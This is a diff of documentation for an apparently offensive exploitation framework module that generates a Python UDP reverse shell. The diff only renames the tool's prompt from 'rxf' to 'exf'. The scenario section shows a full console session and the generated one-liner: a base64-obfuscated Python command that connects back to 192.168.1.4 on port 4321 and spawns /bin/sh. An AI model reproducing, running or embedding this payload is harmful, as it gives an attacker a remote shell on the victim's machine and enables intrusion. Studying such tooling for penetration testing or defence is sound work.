@@ -4,7 +4,7 @@ Module generates payload that creates interactive udp reverse shell by using pyt
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/cmd/python_reverse_udp`
   3. Do: `set lhost 192.168.1.4`
   4. Do: `set lport 4321`
@@ -14,12 +14,12 @@ Module generates payload that creates interactive udp reverse shell by using pyt
 ## Scenarios
 
 ```
-rxf > use payloads/cmd/python_reverse_udp
-rxf (Python Reverse UDP One-Liner) > set lhost 192.168.1.4
+exf > use payloads/cmd/python_reverse_udp
+exf (Python Reverse UDP One-Liner) > set lhost 192.168.1.4
 [+] lhost => 192.168.1.4
-rxf (Python Reverse UDP One-Liner) > set lport 4321
+exf (Python Reverse UDP One-Liner) > set lport 4321
 [+] lport => 4321
-rxf (Python Reverse UDP One-Liner) > run
+exf (Python Reverse UDP One-Liner) > run
 [*] Running module...
 [*] Generating payload
 python -c "exec('aW1wb3J0IG9zCmltcG9ydCBwdHkKaW1wb3J0IHNvY2tldApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjEuNCcsNDMyMSkpCm9zLmR1cDIocy5maWxlbm8oKSwgMCkKb3MuZHVwMihzLmZpbGVubygpLCAxKQpvcy5kdXAyKHMuZmlsZW5vKCksIDIpCnB0eS5zcGF3bignL2Jpbi9zaCcpOwpzLmNsb3NlKCkK'.decode('base64'))"
